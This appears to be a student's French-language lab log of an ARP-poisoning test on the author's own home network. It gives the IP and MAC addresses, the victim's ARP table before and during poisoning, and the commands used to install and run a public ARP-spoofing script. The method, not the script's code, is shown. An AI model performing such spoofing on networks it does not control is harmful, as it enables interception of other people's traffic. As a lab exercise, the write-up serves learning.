j'ai commencé par recuperer les ip et mac de l'ordi attaquant (mon portable) et de la victime (mon fixe) et l'ip de la passerelle (box internet)

j'ai eu

```
Passerelle par défaut. . . . . . . . . : 192.168.1.1
```

sur le pc attaquant

```
Adresse physique . . . . . . . . . . . : 9C-B6-D0-05-18-DB
Adresse IPv4. . . . . . . . . . . . . .: 192.168.1.58(préféré)
```

sur le pc victime

```
Adresse physique . . . . . . . . . . . : B0-3C-DC-4A-DF-EE
Adresse IPv4. . . . . . . . . . . . . .: 192.168.1.35(préféré)
```

table ARP de la victime avant l'empoisonnement

```
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.1.35 --- 0xf
  Adresse Internet      Adresse physique      Type
  192.168.1.1           50-39-2f-11-6a-40     dynamique
  192.168.1.16          30-24-78-90-e6-f7     dynamique
  192.168.1.58          9c-b6-d0-05-18-db     dynamique
  192.168.1.67          2c-93-fb-57-60-10     dynamique
  192.168.1.255         ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

Interface : 192.168.56.1 --- 0x11
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 172.17.96.1 --- 0x17
  Adresse Internet      Adresse physique      Type
  172.17.111.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

```

aver les renseignement de wikipedia sur l'arp poisoning j'ai cherché un scrip de ARP spoofing et trouvé et insltallé [celui-ci](https://github.com/davidlares/arp-spoofing)

je l'ai modifié avec les ip voulues

successivement :

```
PS C:\Windows\System32> pip install six
PS C:\Windows\System32> pip install scapy
PS C:\Users\rapha\Documents\arp-spoofing> python .\spoofer.py
```

spam losque executé (voire [spam arp.pcap](spam arp.pcap))

et voici la table ARP de la victime pendant l'empoisonnement

```
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.1.35 --- 0xf
  Adresse Internet      Adresse physique      Type
  192.168.1.1           9c-b6-d0-05-18-db     dynamique
  192.168.1.16          30-24-78-90-e6-f7     dynamique
  192.168.1.58          9c-b6-d0-05-18-db     dynamique
  192.168.1.67          2c-93-fb-57-60-10     dynamique
  192.168.1.255         ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

Interface : 192.168.56.1 --- 0x11
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 172.17.96.1 --- 0x17
  Adresse Internet      Adresse physique      Type
  172.17.111.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

```
